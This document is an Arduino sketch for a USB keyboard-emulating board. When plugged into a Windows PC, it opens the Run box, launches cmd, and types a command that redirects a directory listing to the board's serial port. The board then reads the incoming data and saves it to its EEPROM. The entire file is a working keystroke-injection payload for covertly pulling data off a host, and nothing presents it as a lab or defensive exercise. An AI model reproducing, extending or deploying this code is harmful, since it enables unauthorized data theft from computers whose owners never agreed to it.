#include <EEPROM.h>
#include <Keyboard.h>

const int maxLen = 500;

void openRunBox() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(120);
  Keyboard.releaseAll();
  delay(400);
}

void typeSlow(const char* s) {
  while (*s) { Keyboard.write(*s++); delay(6); }
}

void openCMD(){
  openRunBox();
  typeSlow("cmd");
  Keyboard.write(KEY_RETURN);
  delay(1000);  // wait for CMD to open
}

void runCMD(){
  typeSlow("dir > \\\\.\\\\COM8");
  Keyboard.write(KEY_RETURN);  // Run the command
}

void setup() {
  Serial.begin(115200);
  while (!Serial);  // wait for host to open port

  openCMD();
  runCMD();
  delay(1000);  // give PC time to send data

  Serial.println("Listening for serial data...");

  static int addr = 0;
  unsigned long start = millis();
  while (millis() - start < 2000) {  // 2 seconds to receive
    while (Serial.available()) {
      char c = Serial.read();
      if (addr < maxLen) {
        EEPROM.update(addr++, c);
        start = millis(); // reset timeout if receiving
      } else {
        Serial.println("EEPROM full.");
        return;
      }
    }
  }

  Serial.println("✅ Done receiving.");
}

void loop() {}
